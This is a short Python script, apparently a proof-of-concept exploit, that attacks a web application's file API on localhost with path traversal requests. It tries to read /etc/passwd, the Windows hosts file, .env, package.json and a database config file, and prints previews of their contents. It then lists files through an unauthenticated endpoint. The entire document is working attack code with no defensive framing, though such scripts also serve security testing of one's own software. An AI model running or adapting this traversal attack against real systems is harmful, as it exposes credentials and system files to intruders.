#!/usr/bin/env python3

import requests

BASE_URL = "http://localhost:5000"

def exploit_directory_traversal():
    system_files = [
        "../../../etc/passwd",
        "../../../windows/system32/drivers/etc/hosts", 
        "../package.json",
        "../.env",
        "../../config/database.js"
    ]
    
    for file_path in system_files:
        response = requests.get(f"{BASE_URL}/api/files/raw/{file_path}")
        
        if response.status_code == 200:
            print(f"[+] Successfully accessed: {file_path}")
            content = response.text[:200] + "..." if len(response.text) > 200 else response.text
            print(f"[+] Content preview: {content}")
        elif response.status_code == 404:
            print(f"[-] File not found: {file_path}")
        else:
            print(f"[?] Unexpected response for {file_path}: {response.status_code}")
    
    list_response = requests.get(f"{BASE_URL}/api/files/list-all")
    
    if list_response.status_code == 200:
        files = list_response.json()
        print(f"[+] Listed {len(files.get('files', []))} files without authentication!")
        
        for file_info in files.get('files', [])[:5]:
            print(f"[+] Found: {file_info.get('filename')} ({file_info.get('size')} bytes)")
    
    return True

if __name__ == "__main__":
    exploit_directory_traversal()